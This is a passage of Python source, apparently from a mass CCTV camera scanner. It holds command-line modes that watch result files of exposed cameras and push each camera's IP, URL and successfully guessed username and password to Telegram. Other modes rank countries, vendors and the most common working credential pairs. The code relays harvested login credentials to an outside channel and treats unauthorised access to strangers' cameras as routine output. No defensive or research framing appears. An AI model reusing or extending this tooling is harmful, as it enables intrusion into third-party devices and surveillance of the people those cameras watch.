    # ── --watch-file PATH: tail a CCTV file, Telegram-notify on new blocks ───
    if '--watch-file' in sys.argv:
        import datetime as _dt_wf
        C, G, Y, W, R, M = (Fore.CYAN, Fore.GREEN, Fore.YELLOW,
                             Style.RESET_ALL, Fore.RED, Fore.MAGENTA)
        _wf_idx = sys.argv.index('--watch-file')
        if _wf_idx + 1 >= len(sys.argv) or sys.argv[_wf_idx + 1].startswith('--'):
            print(f"{R}[!] --watch-file requires a file path.{W}")
            print(f"    e.g.  --watch-file TR_CCTV_Found.txt")
            sys.exit(1)
        _wf_path = sys.argv[_wf_idx + 1]
        if not os.path.exists(_wf_path):
            print(f"{R}[!] File not found: {_wf_path}{W}")
            sys.exit(1)

        _SEP60_wf = '=' * 60

        def _wf_parse_block(raw_block):
            """Parse a raw block string → dict of key-value fields."""
            _cam = {}
            for _ln in raw_block.strip().splitlines():
                if ':' in _ln:
                    _k, _, _v = _ln.partition(':')
                    _cam[_k.strip()] = _v.strip()
            return _cam

        def _wf_blocks_in_text(text):
            """Return list of raw block strings from file text."""
            return [b.strip() for b in text.split(_SEP60_wf) if b.strip()]

        def _wf_format_tg(cam):
            """Build a Telegram HTML message for one camera block."""
            _ip   = cam.get('IP Address', '?')
            _port = cam.get('Port', '?')
            _ct   = cam.get('Camera Type', '?')
            _url  = cam.get('URL', f'http://{_ip}:{_port}')
            _cc   = cam.get('Country Code', '?')
            _cn   = cam.get('Country Name', '?')
            _user = cam.get('Username', '')
            _pass = cam.get('Password', '')
            _ts   = cam.get('Detection Time', '')
            lines = [
                f"<b>📷 New Camera Detected</b>",
                f"<b>Type:</b> {_ct}",
                f"<b>IP:</b> <code>{_ip}:{_port}</code>",
                f"<b>URL:</b> {_url}",
                f"<b>Country:</b> {_cn} ({_cc})",
            ]
            if _user or _pass:
                lines.append(f"<b>Creds:</b> <code>{_user}:{_pass}</code>")
            if _ts:
                lines.append(f"<b>Time:</b> {_ts}")
            return '\n'.join(lines)

        load_telegram_config()
        _tg_enabled = TELEGRAM_CONFIG.get('enabled', False) and bool(
            TELEGRAM_CONFIG.get('destinations'))
        if _tg_enabled:
            start_telegram_worker()

        print(f"\n{C}{'═'*62}{W}")
        print(f"{G}  Watch File  \u2014  {os.path.basename(_wf_path)}{W}")
        print(f"{C}{'═'*62}{W}")
        if _tg_enabled:
            print(f"  {G}Telegram notifications: ENABLED{W}")
        else:
            print(f"  {Y}Telegram not configured \u2014 console-only mode.{W}")
        print(f"  {Y}Watching for new camera blocks... (Ctrl+C to stop){W}\n")

        # Seed with blocks already in the file so we only alert on NEW ones
        with open(_wf_path, 'r', encoding='utf-8', errors='replace') as _wff:
            _wf_seen_text = _wff.read()
        _wf_known = set(_wf_blocks_in_text(_wf_seen_text))
        _wf_total_new = 0

        try:
            while True:
                time.sleep(1.5)
                try:
                    with open(_wf_path, 'r', encoding='utf-8', errors='replace') as _wff:
                        _wf_cur = _wff.read()
                except Exception:
                    continue

                _wf_all = _wf_blocks_in_text(_wf_cur)
                _wf_new = [b for b in _wf_all if b not in _wf_known]
                for _blk in _wf_new:
                    _wf_known.add(_blk)
                    _wf_total_new += 1
                    _cam = _wf_parse_block(_blk)
                    if 'IP Address' not in _cam:
                        continue
                    _now = _dt_wf.datetime.now().strftime('%H:%M:%S')
                    _ip  = _cam.get('IP Address', '?')
                    _pt  = _cam.get('Port', '?')
                    _ct  = _cam.get('Camera Type', '?')
                    _cc  = _cam.get('Country Code', '?')
                    print(f"  {G}[{_now}] #{_wf_total_new:>4}{W}  "
                          f"{C}{_ip}:{_pt}{W}  {Y}{_ct}{W}  [{_cc}]")
                    if _tg_enabled:
                        send_telegram_message(_wf_format_tg(_cam))
        except KeyboardInterrupt:
            print(f"\n{C}{'─'*62}{W}")
            print(f"  {G}Stopped. {_wf_total_new} new camera(s) seen during watch.{W}")
            print(f"{C}{'═'*62}{W}\n")
            if _tg_enabled:
                # Flush any queued messages before exit
                telegram_queue.join()
        sys.exit(0)

    # ── --country-stats: rank all *_CCTV_Found.txt in script dir by camera count
    if '--country-stats' in sys.argv:
        import datetime as _dt_cs
        import glob as _glob_cs
        C, G, Y, W, R, M = (Fore.CYAN, Fore.GREEN, Fore.YELLOW,
                             Style.RESET_ALL, Fore.RED, Fore.MAGENTA)

        _SEP60_cs = '=' * 60
        _cs_pattern = os.path.join(SCRIPT_DIR, '*_CCTV_Found*.txt')
        _cs_files   = sorted(_glob_cs.glob(_cs_pattern))
        # Also pick up dedup / tagged variants alongside the originals
        _cs_extra   = sorted(_glob_cs.glob(os.path.join(SCRIPT_DIR, '*_dedup_*.txt')))
        _cs_extra  += sorted(_glob_cs.glob(os.path.join(SCRIPT_DIR, '*_tagged_*.txt')))
        _cs_all     = list(dict.fromkeys(_cs_files + _cs_extra))

        print(f"\n{C}{'═'*62}{W}")
        print(f"{G}  Country Stats  \u2014  scanning {len(_cs_all)} CCTV file(s){W}")
        print(f"{C}{'═'*62}{W}")

        if not _cs_all:
            print(f"  {Y}No CCTV output files found in:{W}")
            print(f"    {SCRIPT_DIR}")
            print(f"  Run a scan first, e.g.  --country TR")
            print(f"{C}{'═'*62}{W}\n")
            sys.exit(0)

        # Counters
        _cs_by_country   = {}   # CC → {'name': ..., 'count': int, 'files': set}
        _cs_total_cams   = 0
        _cs_total_files  = 0
        _cs_skipped      = 0

        for _csf in _cs_all:
            try:
                with open(_csf, 'r', encoding='utf-8', errors='replace') as _csfh:
                    _cs_text = _csfh.read()
            except Exception:
                _cs_skipped += 1
                continue
            _cs_total_files += 1
            _cs_fname = os.path.basename(_csf)
            _cs_blocks = [b.strip() for b in _cs_text.split(_SEP60_cs) if b.strip()]
            for _blk in _cs_blocks:
                _cam = {}
                for _ln in _blk.strip().splitlines():
                    if ':' in _ln:
                        _k, _, _v = _ln.partition(':')
                        _cam[_k.strip()] = _v.strip()
                if 'IP Address' not in _cam:
                    continue
                _cc_k  = _cam.get('Country Code', 'Unknown').strip().upper() or 'Unknown'
                _cn_v  = _cam.get('Country Name', _cc_k).strip() or _cc_k
                _cs_total_cams += 1
                if _cc_k not in _cs_by_country:
                    _cs_by_country[_cc_k] = {'name': _cn_v, 'count': 0, 'files': set()}
                _cs_by_country[_cc_k]['count'] += 1
                _cs_by_country[_cc_k]['files'].add(_cs_fname)
                # Keep the longest country name seen (most descriptive)
                if len(_cn_v) > len(_cs_by_country[_cc_k]['name']):
                    _cs_by_country[_cc_k]['name'] = _cn_v

        if not _cs_by_country:
            print(f"  {Y}No parseable camera entries found in any file.{W}")
            print(f"{C}{'═'*62}{W}\n")
            sys.exit(0)

        _cs_ranked = sorted(_cs_by_country.items(),
                             key=lambda x: x[1]['count'], reverse=True)
        _cs_max    = _cs_ranked[0][1]['count']
        _cs_bar_w  = 22   # max bar width chars

        print(f"  {Y}Files scanned : {_cs_total_files}"
              + (f"  ({_cs_skipped} skipped)" if _cs_skipped else "") + f"{W}")
        print(f"  {Y}Total cameras : {_cs_total_cams}{W}")
        print(f"  {Y}Countries     : {len(_cs_ranked)}{W}")
        print()
        print(f"  {C}{'Rank':<5} {'CC':<5} {'Country':<28} {'Cams':>6}  Bar{W}")
        print(f"  {C}{'─'*58}{W}")

        for _rank, (_cc, _info) in enumerate(_cs_ranked, 1):
            _cnt   = _info['count']
            _name  = _info['name'][:27]
            _fct   = len(_info['files'])
            _bar_l = max(1, int(_cnt / _cs_max * _cs_bar_w))
            _bar   = '\u2588' * _bar_l
            # colour top 3
            if _rank == 1:   _rc = G
            elif _rank == 2: _rc = Y
            elif _rank == 3: _rc = M
            else:            _rc = W
            _src_note = f"  {Fore.CYAN}({_fct} file{'s' if _fct!=1 else ''}){Style.RESET_ALL}" \
                        if _fct > 1 else ""
            print(f"  {_rc}{_rank:<5}{W} {_cc:<5} {_name:<28} {_rc}{_cnt:>6}{W}  "
                  f"{_rc}{_bar}{W}{_src_note}")

        # Compact per-file summary below the table
        print(f"\n  {C}Files contributing:{W}")
        for _csf in _cs_all[:_cs_total_files]:
            _fn   = os.path.basename(_csf)
            # Count cameras in this file
            try:
                with open(_csf, 'r', encoding='utf-8', errors='replace') as _fh:
                    _ftxt = _fh.read()
                _fcnt = sum(1 for b in _ftxt.split(_SEP60_cs)
                            if b.strip() and 'IP Address' in b)
            except Exception:
                _fcnt = 0
            _sz = os.path.getsize(_csf)
            _sz_s = (f"{_sz//1024}KB" if _sz >= 1024 else f"{_sz}B")
            print(f"    {Y}{_fn:<48}{W}  {_fcnt:>4} cams  {_sz_s}")

        print(f"\n{C}{'═'*62}{W}\n")
        sys.exit(0)

    # ── --top-creds CC: rank credential pairs from CCTV files for a country ───
    if '--top-creds' in sys.argv:
        import glob as _glob_tc
        C, G, Y, W, R, M = (Fore.CYAN, Fore.GREEN, Fore.YELLOW,
                             Style.RESET_ALL, Fore.RED, Fore.MAGENTA)
        _tc_idx = sys.argv.index('--top-creds')
        if _tc_idx + 1 >= len(sys.argv) or sys.argv[_tc_idx + 1].startswith('--'):
            print(f"{R}[!] --top-creds requires a country code.  e.g. --top-creds TR{W}")
            sys.exit(1)
        _tc_cc = sys.argv[_tc_idx + 1].strip().upper()

        # Collect every CCTV file that matches the CC prefix (and dedup/tagged variants)
        _tc_patterns = [
            os.path.join(SCRIPT_DIR, f'{_tc_cc}_CCTV_Found*.txt'),
            os.path.join(SCRIPT_DIR, f'{_tc_cc}_*_dedup_*.txt'),
            os.path.join(SCRIPT_DIR, f'{_tc_cc}_*_tagged_*.txt'),
        ]
        _tc_files = []
        for _tp in _tc_patterns:
            _tc_files += _glob_tc.glob(_tp)
        _tc_files = list(dict.fromkeys(_tc_files))   # deduplicate, preserve order

        print(f"\n{C}{'═'*62}{W}")
        print(f"{G}  Top Creds  \u2014  {_tc_cc}  ({len(_tc_files)} file(s)){W}")
        print(f"{C}{'═'*62}{W}")

        if not _tc_files:
            print(f"  {Y}No CCTV files found for country code: {_tc_cc}{W}")
            print(f"  Expected files like:  {_tc_cc}_CCTV_Found.txt")
            print(f"{C}{'═'*62}{W}\n")
            sys.exit(0)

        _SEP60_tc = '=' * 60
        _tc_pair_hits  = {}   # (user, pwd) → int
        _tc_user_hits  = {}   # user        → int
        _tc_total_cams = 0
        _tc_with_creds = 0
        _tc_files_used = 0

        for _tcf in _tc_files:
            try:
                with open(_tcf, 'r', encoding='utf-8', errors='replace') as _fh:
                    _tc_text = _fh.read()
            except Exception:
                continue
            _tc_files_used += 1
            for _blk in _tc_text.split(_SEP60_tc):
                _blk = _blk.strip()
                if not _blk:
                    continue
                _cam = {}
                for _ln in _blk.splitlines():
                    if ':' in _ln:
                        _k, _, _v = _ln.partition(':')
                        _cam[_k.strip()] = _v.strip()
                if 'IP Address' not in _cam:
                    continue
                _tc_total_cams += 1
                _u = _cam.get('Username', '').strip()
                _p = _cam.get('Password', '').strip()
                if not _u and not _p:
                    continue
                _tc_with_creds += 1
                _pair = (_u, _p)
                _tc_pair_hits[_pair]  = _tc_pair_hits.get(_pair, 0) + 1
                _tc_user_hits[_u]     = _tc_user_hits.get(_u, 0) + 1

        print(f"  {Y}Files read     : {_tc_files_used}{W}")
        print(f"  {Y}Total cameras  : {_tc_total_cams}{W}")
        print(f"  {Y}With creds     : {_tc_with_creds}"
              + (f"  ({_tc_with_creds*100//_tc_total_cams}%)" if _tc_total_cams else "")
              + f"{W}")

        if not _tc_pair_hits:
            print(f"\n  {Y}No credential fields found in any block.{W}")
            print(f"  Credential pairs are written only when a login succeeds;")
            print(f"  run a scan with --country {_tc_cc} to populate them.")
            print(f"{C}{'═'*62}{W}\n")
            sys.exit(0)

        # ── Credential-pair table ──────────────────────────────────────────
        _tc_ranked = sorted(_tc_pair_hits.items(), key=lambda x: x[1], reverse=True)
        _tc_top_n  = min(30, len(_tc_ranked))
        _tc_max    = _tc_ranked[0][1]
        _tc_bar_w  = 18

        print(f"\n  {C}Top {_tc_top_n} credential pairs (of {len(_tc_ranked)} unique):{W}")
        print(f"  {C}{'─'*58}{W}")
        print(f"  {C}{'Rank':<5} {'Username':<18} {'Password':<18} {'Hits':>5}  Bar{W}")
        print(f"  {C}{'─'*58}{W}")

        for _rank, ((_u, _p), _cnt) in enumerate(_tc_ranked[:_tc_top_n], 1):
            _bar = '\u2588' * max(1, int(_cnt / _tc_max * _tc_bar_w))
            _pct = _cnt * 100 // _tc_with_creds if _tc_with_creds else 0
            if   _rank == 1: _rc = G
            elif _rank == 2: _rc = Y
            elif _rank == 3: _rc = M
            else:            _rc = W
            _u_s = (_u[:16] + '..') if len(_u) > 18 else _u
            _p_s = (_p[:16] + '..') if len(_p) > 18 else _p
            print(f"  {_rc}{_rank:<5}{W} {_u_s:<18} {_p_s:<18} "
                  f"{_rc}{_cnt:>5}{W}  {_rc}{_bar}{W}  {_pct}%")

        # ── Username-only breakdown ────────────────────────────────────────
        _tc_u_ranked = sorted(_tc_user_hits.items(), key=lambda x: x[1], reverse=True)
        _tc_u_top    = min(10, len(_tc_u_ranked))
        _tc_u_max    = _tc_u_ranked[0][1] if _tc_u_ranked else 1

        print(f"\n  {C}Top {_tc_u_top} usernames:{W}")
        print(f"  {C}{'─'*40}{W}")
        for _rank, (_u, _cnt) in enumerate(_tc_u_ranked[:_tc_u_top], 1):
            _bar = '\u2588' * max(1, int(_cnt / _tc_u_max * 14))
            _pct = _cnt * 100 // _tc_with_creds if _tc_with_creds else 0
            _rc  = G if _rank == 1 else (Y if _rank == 2 else W)
            print(f"  {_rc}{_rank:<4}{W} {_u:<20} {_rc}{_cnt:>5}{W}  {_rc}{_bar}{W}  {_pct}%")

        # ── Files used ────────────────────────────────────────────────────
        print(f"\n  {C}Files:{W}")
        for _tcf in _tc_files[:_tc_files_used]:
            _fn = os.path.basename(_tcf)
            _sz = os.path.getsize(_tcf)
            _sz_s = f"{_sz//1024}KB" if _sz >= 1024 else f"{_sz}B"
            print(f"    {Y}{_fn}{W}  {_sz_s}")

        print(f"\n{C}{'═'*62}{W}\n")
        sys.exit(0)

    # ── --vendor-stats [DIR] [--top N]: rank vendors by camera count ──────────
    if '--vendor-stats' in sys.argv:
        import glob as _glob_vs
        _vs_idx   = sys.argv.index('--vendor-stats')
        _vs_dir   = (sys.argv[_vs_idx + 1]
                     if _vs_idx + 1 < len(sys.argv) and not sys.argv[_vs_idx + 1].startswith('--')
                     else SCRIPT_DIR)
        _vs_top_n = 20
        if '--top' in sys.argv:
            try: _vs_top_n = int(sys.argv[sys.argv.index('--top') + 1])
            except: pass
        C, G, Y, W, R, M = (Fore.CYAN, Fore.GREEN, Fore.YELLOW,
                             Style.RESET_ALL, Fore.RED, Fore.MAGENTA)
        _vs_pats  = [
            os.path.join(_vs_dir, '*ValidCamera*.txt'),
            os.path.join(_vs_dir, '*CCTV_Found*.txt'),
        ]
        _vs_files = []
        for _vp in _vs_pats:
            _vs_files += _glob_vs.glob(_vp)
        _vs_files = list(dict.fromkeys(_vs_files))
        if not _vs_files:
            print(f"\n  {Y}No CCTV result files found in: {_vs_dir}{W}\n")
            sys.exit(0)
        _vs_vendor_cams  = {}
        _vs_vendor_creds = {}
        _vs_vendor_cc    = {}
        _vs_vendor_pairs = {}
        _vs_total        = 0
        _vs_cred_total   = 0
        for _vsf in _vs_files:
            try:
                _vst = open(_vsf, 'r', encoding='utf-8', errors='replace').read()
            except Exception:
                continue
            _vs_sep  = '=' * 60
            _vs_blks = [b.strip() for b in _vst.split(_vs_sep) if b.strip()]
            if len(_vs_blks) <= 1:
                _vs_blks = [b.strip() for b in _vst.split('\n\n') if b.strip()]
            for _vb in _vs_blks:
                _vc = {}
                for _vln in _vb.splitlines():
                    if ':' in _vln:
                        _k, _, _v = _vln.partition(':')
                        _vc[_k.strip()] = _v.strip()
                if 'IP Address' not in _vc and 'IP' not in _vc:
                    continue
                _vs_total += 1
                _vend = (_vc.get('Type') or _vc.get('Camera Type') or 'Unknown').strip() or 'Unknown'
                _vs_vendor_cams[_vend]  = _vs_vendor_cams.get(_vend, 0) + 1
                _vcc  = (_vc.get('Country') or 'Unknown').strip() or 'Unknown'
                _vs_vendor_cc.setdefault(_vend, {})
                _vs_vendor_cc[_vend][_vcc] = _vs_vendor_cc[_vend].get(_vcc, 0) + 1
                _vu = _vc.get('Username', '').strip()
                _vp2 = _vc.get('Password', '').strip()
                if _vu or _vp2:
                    _vs_cred_total += 1
                    _vs_vendor_creds[_vend] = _vs_vendor_creds.get(_vend, 0) + 1
                    _vpair = f"{_vu}:{_vp2}"
                    _vs_vendor_pairs.setdefault(_vend, {})
                    _vs_vendor_pairs[_vend][_vpair] = _vs_vendor_pairs[_vend].get(_vpair, 0) + 1
        _vs_ranked = sorted(_vs_vendor_cams.items(), key=lambda x: x[1], reverse=True)
        _vs_show   = min(_vs_top_n, len(_vs_ranked))
        _vs_max    = _vs_ranked[0][1] if _vs_ranked else 1
        _vs_bar_w  = 16
        print(f"\n{C}{'═'*66}{W}")
        print(f"{G}  Vendor Stats  \u2014  {_vs_dir}{W}")
        print(f"  {Y}Files   : {len(_vs_files)}   Total cameras: {_vs_total:,}   "
              f"With creds: {_vs_cred_total:,}{W}")
        print(f"{C}{'═'*66}{W}\n")
        for _vrank, (_vend, _vcnt) in enumerate(_vs_ranked[:_vs_show], 1):
            _vbar  = '\u2588' * max(1, int(_vcnt / _vs_max * _vs_bar_w))
            _vbar += '\u2591' * (_vs_bar_w - len(_vbar))
            _vpct  = _vcnt * 100 // _vs_total if _vs_total else 0
            _vcred = _vs_vendor_creds.get(_vend, 0)
            _vcpct = _vcred * 100 // _vcnt if _vcnt else 0
            _rc    = G if _vrank == 1 else (Y if _vrank == 2 else (M if _vrank == 3 else W))
            print(f"{_rc}#  {_vrank:<3}{W} {_vend}")
            print(f"       Total   : {_rc}{_vcnt:>7,}{W}  ({_vpct}%)  {_rc}{_vbar}{W}")
            print(f"       Creds   : {_vcred:>7,}  ({_vcpct}% success rate)")
            _top_cc   = sorted(_vs_vendor_cc.get(_vend, {}).items(),    key=lambda x: x[1], reverse=True)[:3]
            _top_pair = sorted(_vs_vendor_pairs.get(_vend, {}).items(), key=lambda x: x[1], reverse=True)[:3]
            if _top_cc:
                _cc_str = '  |  '.join(f"{_c} ({_n:,})" for _c, _n in _top_cc)
                print(f"       Countries: {_cc_str}")
            if _top_pair:
                _pair_str = '  |  '.join(f"{_pr} ({_n:,})" for _pr, _n in _top_pair)
                print(f"       Top creds: {_pair_str}")
            print()
        print(f"Showing {_vs_show} of {len(_vs_ranked)} vendors  |  "
              f"{_vs_total:,} total cameras  |  {len(_vs_files)} files scanned")
        print(f"\n{C}{'═'*66}{W}\n")
        sys.exit(0)

    # ── --port-stats [DIR] [--top N]: rank ports by camera count + cred rate ──
